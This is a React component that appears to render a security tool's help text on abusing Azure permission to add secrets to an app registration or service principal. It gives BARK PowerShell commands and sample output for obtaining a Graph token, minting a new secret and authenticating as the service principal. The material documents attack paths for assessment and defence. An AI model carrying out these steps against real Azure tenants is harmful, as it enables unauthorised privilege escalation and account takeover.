import React from 'react';

const Abuse = () => {
    return (
        <>
            <p>
                There are several ways to perform this abuse, depending on what
                sort of access you have to the credentials of the object that
                holds this privilege against the target object. If you have an
                interactive web browser session for the Azure portal, it is as
                simple as finding the target App in the portal and adding a new
                secret to the object using the “Certificates & secrets” tab.
                Service Principals do not have this tab in the Azure portal but
                you can add secrets to them with the MS Graph API.
            </p>

            <p>
                No matter what kind of control you have, you will be able to
                perform this abuse by using BARK’s New-AppRegSecret or
                New-ServicePrincipalSecret functions.
            </p>
            <p>
                These functions require you to supply an MS Graph-scoped JWT
                associated with the principal that has the privilege to add a
                new secret to your target application. There are several ways to
                acquire a JWT. For example, you may use BARK’s
                Get-GraphTokenWithRefreshToken to acquire an MS Graph-scoped JWT
                by supplying a refresh token:
                <pre>
                    <code>
                        $MGToken = Get-GraphTokenWithRefreshToken -RefreshToken
                        &quot;0.ARwA6WgJJ9X2qk…&quot; -TenantID &quot;contoso.onmicrosoft.com&quot;
                    </code>
                </pre>
            </p>

            <p>
                Then use BARK’s New-AppRegSecret to add a new secret to the
                target application:
                <pre>
                    <code>
                        New-AppRegSecret -AppRegObjectID &quot;d878…&quot; -Token
                        $MGToken.access_token
                    </code>
                </pre>
            </p>

            <p>
                The output will contain the plain-text secret you just created
                for the target app:
                <pre>
                    <code>
                        PS /Users/andyrobbins&gt; New-AppRegSecret -AppRegObjectID
                        &quot;d878…&quot; -Token $MGToken.access_token Name Value ----
                        ----- AppRegSecretValue odg8Q~... AppRegAppId 4d31…
                        AppRegObjectId d878…
                    </code>
                </pre>
            </p>

            <p>
                With this plain text secret, you can now acquire tokens as the
                service principal associated with the app. You can easily do
                this with BARK’s Get-MSGraphToken function:
                <pre>
                    <code>
                        PS /Users/andyrobbins&gt; $SPToken = Get-MSGraphToken
                        `-ClientID &quot;4d31…&quot; `-ClientSecret &quot;odg8Q~...&quot;
                        `-TenantName &quot;contoso.onmicrosoft.com&quot; PS
                        /Users/andyrobbins&gt; $SPToken.access_token
                        eyJ0eXAiOiJKV1QiLCJub…
                    </code>
                </pre>
            </p>

            <p>
                Now you can use this JWT to perform actions against any other MS
                Graph endpoint as the service principal, continuing your attack
                path with the privileges of that service principal.
            </p>
        </>
    );
};

export default Abuse;
